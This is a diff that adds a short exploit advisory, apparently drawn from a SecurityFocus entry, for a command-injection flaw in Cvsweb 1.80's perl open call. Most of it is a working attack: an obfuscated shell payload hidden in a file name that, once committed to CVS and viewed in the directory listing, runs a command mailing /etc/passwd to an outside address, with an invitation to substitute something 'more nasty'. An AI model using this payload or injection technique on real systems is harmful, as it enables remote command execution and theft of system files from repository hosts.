@@ -1,0 +1,12 @@
+source: http://www.securityfocus.com/bid/1469/info
+
+Cvsweb 1.80 makes an insecure call to the perl OPEN function, providing attackers with write access to a cvs repository the ability to execute arbitrary commands on the host machine. The code that is being exploited here is the following: open($fh, "rlog '$filenames' 2>/dev/null |")
+
+An attack looks something like this:
+
+SHELLCODE="';perl -e '\$_=q{mail foo#bar.baz < !etc!passwd}; y:!#:\x2F\x40:; system \$_';'"
+touch $SHELLCODE
+cvs add $SHELLCODE
+cvs commit -m '' $SHELLCODE
+
+Then the attacker either visits the cvsweb page that is a directory listing for the directory they put the trojan file in, or they wait for someone else to do the same. Views of this page cause the command to be executed, mailing /etc/passwd to the attacker or [insert something more nasty here].
